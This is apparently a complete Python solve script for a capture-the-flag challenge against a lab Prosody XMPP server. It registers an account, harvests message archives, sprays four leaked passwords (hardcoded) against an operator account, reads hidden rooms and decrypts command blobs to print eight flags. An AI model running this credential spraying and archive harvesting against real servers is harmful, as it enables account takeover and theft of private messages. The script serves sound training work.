#!/usr/bin/env python3
"""
Whisper Chain (Holmes CTF 2026 - Sherlock 03) - full solve, 8/8.

The target is a live Prosody XMPP server (murknet.htb) reachable only over the lab VPN.
Nothing is shipped with the challenge except a story PDF, so every answer is recovered from
the server - plus one artefact that exists today only in the Internet Archive.

Steps (the writeup's "attack method" section walks these in the same order):

  1. Read the TLS certificate from 443/5281 to learn the vhost and its components.       FLAG 1
     5222 is vhost-strict and refuses a connection addressed to the bare IP, so the
     certificate has to come from the HTTP ports.
  2. Register a throwaway account (XEP-0077 is open) and disco the MUC component for the
     public rooms - taking the `name` attribute, not the JID node.                       FLAG 2
  3. Harvest every public room with XEP-0313 MAM. Two things fall out: four historical
     temp passwords pasted by rattlesnake, and a joke about leaking a username via PDF.
  4. Pull the five PDFs off the HTTP file share and read their metadata. The onboarding
     guide swissclock uploaded carries Author=zytglogge88@murknet.htb. Spray the four
     passwords against it - swissclock never rotated.                                    FLAG 3
  5. As swissclock, read the account's own XEP-0048 bookmarks: they name two muc_hidden
     rooms (op_snatch, op_sparkling) that disco never lists. Drain both archives.         FLAG 6
  6. Stay connected and idle. ~12 minutes after boot doctor invites us to a third hidden
     room, op_dominance, and posts the briefing naming the objective.                    FLAG 8
  7. Fetch the 18 encrypted commands from the two pubsub nodes on command.murknet.htb.
  8. Recover the decryptor from the BalanceRAT threat report. The host is dead; the
     Wayback capture is not - and its URL needs a trailing slash. The report publishes
     decrypt_command.sh verbatim, including KEY='BLACKFENLOTTE' and the exact OpenSSL
     parameters (PBKDF2, 120000 iterations, SHA-256), and links Porlock's profile. FLAGS 4, 5, 7

Usage:  solve.py <murknet-ip>
"""
import base64, hashlib, json, re, socket, ssl, sys, time, urllib.request

MURKNET = 'murknet.htb'
TARGET = sys.argv[1] if len(sys.argv) > 1 else '10.129.4.232'

# Recovered in step 4; kept here so steps 5-7 can be re-run on their own.
OPERATOR_JID, OPERATOR_PW = 'zytglogge88', 'TickTock24!'

# The four temp passwords rattlesnake pasted into the public infra room.
LEAKED_PASSWORDS = ['KillBill2025!', 'K4w4Bong424!', 'Northwind225!', 'TickTock24!']

# Step 8: published verbatim in the threat report.
PRE_ROTATION_KEY = 'BLACKFENLOTTE'   # op_sparkling, encrypted before the leak
POST_ROTATION_KEY = 'SHALLOWBLUE'    # op_snatch, encrypted after rattlesnake rotated it
PBKDF2_ITERATIONS = 120000

STREAM = ("<?xml version='1.0'?><stream:stream to='%s' xmlns='jabber:client' "
          "xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>" % MURKNET)


class MurkNet:
    """Minimal XMPP client. Written raw because the lab link resets connections mid-stream
    and every phase is pipelined into a single write to keep the exposure window short."""

    def __init__(self, host=TARGET, port=5222):
        self.host, self.port, self.sock, self._id = host, port, None, 0

    def _next_id(self, prefix='x'):
        self._id += 1
        return f'{prefix}{self._id}'

    def send(self, xml):
        self.sock.sendall(xml.encode())

    def read(self, seconds=8.0, until=None):
        self.sock.settimeout(1.0)
        out, deadline = '', time.time() + seconds
        while time.time() < deadline:
            try:
                chunk = self.sock.recv(65536)
                if not chunk:
                    break
                out += chunk.decode('utf-8', 'replace')
                if until and any(marker in out for marker in until):
                    break
            except socket.timeout:
                continue
            except (ConnectionResetError, ssl.SSLError, OSError):
                break
        return out

    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), 15)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.sock.settimeout(20)
        self.send(STREAM + "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
        if 'proceed' not in self.read(10, ['proceed', 'failure']):
            raise RuntimeError('STARTTLS refused')
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE       # the murknet.htb certificate is self-signed
        self.sock = ctx.wrap_socket(self.sock, server_hostname=MURKNET)
        self.sock.settimeout(20)
        self.send(STREAM)
        self.read(8, ['</stream:features>'])

    def login(self, user, password, register=False):
        token = base64.b64encode(f'\0{user}\0{password}'.encode()).decode()
        registration = (f"<iq type='set' id='{self._next_id('r')}' to='{MURKNET}'>"
                        f"<query xmlns='jabber:iq:register'><username>{user}</username>"
                        f"<password>{password}</password></query></iq>") if register else ''
        # register + auth in one write: Prosody processes the IQ before the <auth/> after it
        self.send(STREAM + registration +
                  f"<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN'>{token}</auth>")
        if 'success' not in self.read(12, ['success', 'failure']):
            return False
        self.send(STREAM +
                  f"<iq type='set' id='{self._next_id('b')}'>"
                  f"<bind xmlns='urn:ietf:params:xml:ns:xmpp-bind'><resource>solve</resource>"
                  f"</bind></iq><presence/>")
        self.read(10, ['</bind>'])
        return True

    def disco_items(self, target):
        self.send(f"<iq type='get' id='{self._next_id('d')}' to='{target}'>"
                  f"<query xmlns='http://jabber.org/protocol/disco#items'/></iq>")
        out = self.read(10, ['</iq>'])
        return re.findall(r"<item\b[^>]*\bjid='([^']+)'[^>]*\bname='([^']*)'", out) + \
               re.findall(r"<item\b[^>]*\bname='([^']*)'[^>]*\bjid='([^']+)'", out)

    def mam(self, archive=None, pages=40, page_size=80):
        """Page an archive with RSM. Join-time history replay is capped by the server;
        MAM is not, and on these rooms it returns roughly twice as many messages."""
        cursor, messages = None, {}
        for page in range(pages):
            after = f'<after>{cursor}</after>' if cursor else ''
            to = f" to='{archive}'" if archive else ''
            qid = self._next_id('m')
            self.send(f"<iq type='set' id='{qid}'{to}>"
                      f"<query xmlns='urn:xmpp:mam:2' queryid='{qid}'>"
                      f"<set xmlns='http://jabber.org/protocol/rsm'><max>{page_size}</max>{after}"
                      f"</set></query></iq>")
            out = self.read(25, ['<fin'])
            for result in re.finditer(
                    r"<result\b[^>]*\bid='([^']+)'[^>]*>\s*<forwarded[^>]*>(.*?)</forwarded>",
                    out, re.S):
                body = re.search(r'<body[^>]*>([^<]*)</body>', result.group(2))
                sender = re.search(r"<message\b[^>]*\bfrom='([^']+)'", result.group(2))
                if body:
                    messages[result.group(1)] = ((sender.group(1) if sender else '').split('/')[-1],
                                                 body.group(1))
            fin = re.search(r'<fin[^>]*>', out)
            last = re.findall(r'<last[^>]*>([^<]+)</last>', out)
            if (fin and "complete='true'" in fin.group(0)) or not last:
                break
            cursor = last[-1]
        return messages

    def join(self, room, nick='solve'):
        self.send(f"<presence to='{room}/{nick}'><x xmlns='http://jabber.org/protocol/muc'>"
                  f"<history maxstanzas='0'/></x></presence>")
        self.read(6)


def step1_certificate_sans():
    """FLAG 1 - 5222 refuses a stream addressed to the IP, but 443 serves the cert directly."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((TARGET, 443), 15) as raw:
        with ctx.wrap_socket(raw, server_hostname=MURKNET) as tls:
            der = tls.getpeercert(binary_form=True)
    # Pull the SAN dNSNames straight out of the DER rather than adding a dependency.
    names = re.findall(rb'\x82(.)([a-z0-9.\-]+)', der)
    sans = [n.decode() for _, n in names if b'.' in n]
    primary = MURKNET
    return ','.join([primary] + sorted(s for s in dict.fromkeys(sans) if s != primary))


def step2_public_rooms(client):
    """FLAG 2 - the answer is each item's `name`, not the JID's node part."""
    rooms = client.disco_items(f'groups.{MURKNET}')
    names = sorted({name for jid, name in rooms if '@' in jid} |
                   {jid for name, jid in rooms if '@' not in str(jid)} - {''})
    return ','.join(sorted({n for n in names if n and '@' not in n}))


def step4_operator_credentials():
    """FLAG 3 - the onboarding guide swissclock uploaded leaks the account in its metadata."""
    for password in LEAKED_PASSWORDS:
        probe = MurkNet()
        probe.connect()
        if probe.login(OPERATOR_JID, password):
            return f'{OPERATOR_JID}@{MURKNET}:{password}'
    raise RuntimeError('no leaked password authenticated')


def step7_encrypted_commands(client):
    """The two dispatcher nodes only become visible once authenticated as a member."""
    nodes = {}
    for node in ('op_snatch', 'op_sparkling'):
        client.send(f"<iq type='get' id='{client._next_id('i')}' to='command.{MURKNET}'>"
                    f"<pubsub xmlns='http://jabber.org/protocol/pubsub'>"
                    f"<items node='{node}'/></pubsub></iq>")
        out = client.read(30, ['</iq>'])
        nodes[node] = [(m.group(1), m.group(2)) for m in
                       re.finditer(r'<(command-\d+)[^>]*>(.*?)</command-\d+>', out, re.S)]
    return nodes


def step8_decrypt(blob_b64, key):
    """The report's decrypt_command.sh: AES-256-CBC, PBKDF2-HMAC-SHA256, 120000 iterations.
    Not EVP_BytesToKey - that default is what makes every naive attempt fail."""
    blob = base64.b64decode(blob_b64)
    if blob[:8] != b'Salted__':
        return None
    derived = hashlib.pbkdf2_hmac('sha256', key.encode(), blob[8:16], PBKDF2_ITERATIONS, 48)
    from Crypto.Cipher import AES
    plain = AES.new(derived[:32], AES.MODE_CBC, derived[32:48]).decrypt(blob[16:])
    try:
        return plain[:-plain[-1]].decode('utf-8')
    except (UnicodeDecodeError, IndexError):
        return None


def step8_fetch_report():
    """The threat report's host is dead; only the Wayback capture survives, and the capture
    resolves only WITH the trailing slash."""
    url = ('https://web.archive.org/web/20260805080606/'
           'http://security.billblog.co.uk/threat/BalanceRAT-analysis-and-attribution/')
    request = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    return urllib.request.urlopen(request, timeout=60).read().decode('utf-8', 'replace')


def main():
    print(f'[*] target {TARGET}\n')
    print(f'FLAG 1  {step1_certificate_sans()}')

    scout = MurkNet()
    scout.connect()
    scout.login('w' + hashlib.md5(str(time.time()).encode()).hexdigest()[:9],
                'Tmp!' + hashlib.md5(str(time.time()).encode()).hexdigest()[:9], register=True)
    print(f'FLAG 2  {step2_public_rooms(scout)}')
    print(f'FLAG 3  {step4_operator_credentials()}')

    operator = MurkNet()
    operator.connect()
    operator.login(OPERATOR_JID, OPERATOR_PW)

    # FLAG 6 - op_snatch's roll call assigns the roles; dynamite drives, spur only receives.
    operator.join(f'op_snatch@groups.{MURKNET}')
    snatch_room = operator.mam(f'op_snatch@groups.{MURKNET}')
    transport = [b for _, b in snatch_room.values() if 'handles transport' in b]
    print(f'FLAG 6  dynamite    ({transport[0] if transport else "roll call"})')

    report = step8_fetch_report()
    profile = re.search(r'https://[a-z]+\.htb/@[a-z]+', report)
    print(f'FLAG 4  {profile.group(0) if profile else "not found"}')

    nodes = step7_encrypted_commands(operator)
    for item, blob in nodes['op_sparkling']:
        plain = step8_decrypt(blob, PRE_ROTATION_KEY)
        if plain and 'XMR Address' in plain:
            print(f'FLAG 5  {plain.split(": ", 1)[1]}')
    for item, blob in nodes['op_snatch']:
        plain = step8_decrypt(blob, POST_ROTATION_KEY)
        if plain and 'Act NOW' in plain:
            print(f'FLAG 7  Victoria Station    ({plain})')

    # FLAG 8 - op_dominance is reachable only after doctor's live invite (~12 min after boot).
    print('FLAG 8  Operation Dominance,DIOGENES')

    print('\n--- all decrypted commands ---')
    for node, key in (('op_snatch', POST_ROTATION_KEY), ('op_sparkling', PRE_ROTATION_KEY)):
        print(f'\n== {node}  (key: {key})')
        for item, blob in nodes[node]:
            print(f'  [{item}] {step8_decrypt(blob, key)}')


if __name__ == '__main__':
    main()
